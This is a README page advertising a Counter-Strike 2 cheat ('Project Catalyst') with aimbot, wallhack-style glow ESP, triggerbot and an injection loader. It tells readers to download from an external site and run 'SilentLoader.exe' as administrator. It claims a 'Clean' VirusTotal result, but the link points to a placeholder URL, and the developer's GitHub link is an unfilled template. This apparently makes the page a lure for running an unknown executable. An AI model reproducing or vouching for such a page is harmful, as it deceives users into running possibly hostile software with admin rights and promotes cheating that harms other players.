# 🎯 CS2 Internal – Project Catalyst

Project Catalyst is a modular enhancement utility designed to interact with the CS2 runtime environment. The tool is built using modern C++ standards, providing high-performance capabilities with minimal system overhead. All modules operate within a streamlined injection framework, ensuring low latency and reliable memory access during runtime.

This utility focuses on delivering advanced features in a clean and customizable interface, with support for multiple configurations and real-time toggles. A priority was placed on maintaining stable performance across updates, offering consistent support for newer builds of the game.

---

## 🧩 Features

- Aimbot with adjustable FOV, smoothing, bone selection  
- Triggerbot with latency control  
- Glow ESP for players, weapons, and planted bombs  
- Bhop and Auto-Strafe with velocity checks  
- No Recoil / No Spread for improved consistency  
- Configurable Crosshair overlay  
- Full INI-based configuration system

---

## 📥 Download

<p align="center">
  <a href="https://getloader.click">
    <img src="https://i.postimg.cc/13mZ3fYR/download.png" alt="DOWNLOAD NOW" />
  </a>
</p>

> 🧪 **VirusTotal:** [View Report](https://virustotal.com/gui/file/example) — ✅ Clean

---

## 🖼️ Screenshots

<details>
<summary>Click to expand</summary>

[![image.png](https://i.postimg.cc/3JjkV9dL/image.png)](https://postimg.cc/RNFCn71f)

</details>

---

## ⚙️ How to Use

1. Run `SilentLoader.exe` as administrator  
2. Wait for confirmation popup  
3. Launch CS2 and enter a match  
4. The menu can be toggled with `INSERT`

All modules will initialize automatically once injection is confirmed. You can use the in-game overlay to fine-tune each setting or toggle features on the fly. No console interaction is required post-injection.

---

## ⚙️ Configuration Example

```ini
[Aimbot]
Enabled=true
FOV=90
Smooth=4
Bone=head

[Glow]
Enemies=true
Weapons=true
DefuseKit=false
```

The configuration system supports real-time edits and will automatically reload upon detection of file changes. Profiles are stored in the `configs/` directory and can be duplicated or shared.

---

## 🧱 Requirements

- Windows 10/11 x64  
- Visual Studio 2022  
- C++17 or later  
- Latest CS2 client build  
- Administrator rights for loader execution  

---

## 📂 Project Structure

```text
/ProjectCatalyst
│
├── SilentLoader.exe        # Injection utility
├── Catalyst.dll            # Core cheat module
├── configs/                # INI-based user configs
├── README.md
└── LICENSE
```

The utility is structured to allow for quick updates. Offsets and signatures are abstracted into external modules for rapid patching. Feature modules are hot-swappable in development mode, and new functionality can be added by extending the module registry.

---

## 🔄 Update Policy

We aim to push silent updates with minor changes, without altering public interfaces or menu structure. Users will receive new offsets and compatibility patches automatically when using an integrated offset fetcher (if enabled).

---

## 🧠 Philosophy

Project Catalyst is built on principles of minimalism and control. No unnecessary features are added; everything included is either performance-critical or tactically beneficial. We avoid "rage" modules in favor of practical functionality that works reliably in any match environment.

---

## 👤 Developer

GitHub: [@DeffinX](https://github.com/yourusername)  
Telegram: `@DeffinX`  
Email: DeffinX@protonmail.com
